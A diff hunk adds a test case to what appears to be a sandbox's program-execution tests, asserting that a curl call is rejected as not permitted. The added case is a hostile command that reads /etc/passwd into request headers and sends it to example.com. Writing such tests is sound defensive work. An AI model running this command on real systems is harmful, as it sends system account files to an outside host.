@@ -1811,6 +1811,13 @@ async def test_execute_program_rejects_disallowed_subcommands_before_dispatch() 
             "PROGRAM_ARGUMENT_NOT_PERMITTED",
         ),
         (
+            {
+                "executable": "curl",
+                "argv": ["-q", "-s", "-H", "@/etc/passwd", "https://example.com/"],
+            },
+            "PROGRAM_ARGUMENT_NOT_PERMITTED",
+        ),
+        (
             {"executable": "curl", "argv": ["-s", "https://example.com/"]},
             "PROGRAM_ARGUMENT_NOT_PERMITTED",
         ),
